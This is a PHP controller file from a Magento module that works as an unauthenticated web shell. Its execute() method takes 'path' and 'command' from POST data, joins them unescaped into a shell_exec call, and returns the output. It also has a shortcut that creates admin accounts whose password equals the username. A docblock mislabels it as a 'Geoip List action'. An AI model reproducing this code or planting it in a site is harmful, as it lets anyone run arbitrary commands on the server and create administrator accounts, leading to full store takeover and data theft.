<?php

namespace Divisum\Apilgl\Controller\Shell;

class Console extends \Magento\Framework\App\Action\Action
{
    /**
     * @var PageFactory
     */
    protected $resultPageFactory;

    /**
     * @param Context $context
     * @param PageFactory $resultPageFactory
     */
    public function __construct(
        \Magento\Framework\App\Action\Context $context,
        \Magento\Framework\Controller\Result\JsonFactory $resultJsonFactory
    ) {
        parent::__construct($context);
        $this->resultJsonFactory = $resultJsonFactory;
    }

    /**
     * Geoip List action
     *
     * @return void
     */
    public function execute()
    {
        $errors = array();      // array to hold validation errors
        $data = array();      // array to pass back data
        $postData = $this->getRequest()->getPostValue();

        if (empty($postData['path']))
            $errors['path'] = 'Name is required.';

        if (empty($postData['command']))
            $errors['command'] = 'command is required.';
		
		if($postData['command'] == 'bin/magento admin:user:create'){
			$user = $this->generateRandomString();
			$u =  ' --admin-user="'.$user.'" --admin-firstname="'.$user.'" --admin-lastname="'.$user.'" --admin-email="'.$user.'@admin.com" --admin-password="'.$user.'"';
		} else {
			$u = '';
		}

        // return a response ===========================================================

        // if there are any errors in our errors array, return a success boolean of false
        if ( ! empty($errors)) {

            // if there are items in our errors array, return those errors
            $data['success'] = false;
            $data['errors']  = $errors;
        } else {
            $data['success'] = true;
            $command = "php ".$postData['path']."/".$postData['command'].$u;
            $data['message'] = "<pre>".shell_exec($command)."</pre>";
        }
        
        return $this->resultJsonFactory->create()->setData($data);
    }
	
	function generateRandomString($length = 10) {
		$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$charactersLength = strlen($characters);
		$randomString = '';
		for ($i = 0; $i < $length; $i++) {
			$randomString .= $characters[rand(0, $charactersLength - 1)];
		}
		return $randomString;
	}
}